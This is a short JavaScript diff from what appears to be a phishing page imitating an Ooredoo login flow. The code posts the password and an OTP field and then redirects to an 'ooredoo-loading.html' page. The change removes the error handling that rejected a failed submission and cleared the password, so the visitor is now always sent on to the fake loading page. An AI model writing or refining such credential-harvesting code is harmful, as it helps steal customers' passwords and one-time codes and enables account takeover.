@@ -190,13 +190,8 @@
                   otp: ""
               }
           })
-        }).then(function(response){
-          if(!response.ok) throw new Error('rejected');
+        }).finally(function(){
           window.location.href='ooredoo-loading.html?ref=' + encodeURIComponent(ref);
-        }).catch(function(){
-          error.classList.add('visible');
-          password.value='';
-          password.focus();
       });
     }
 
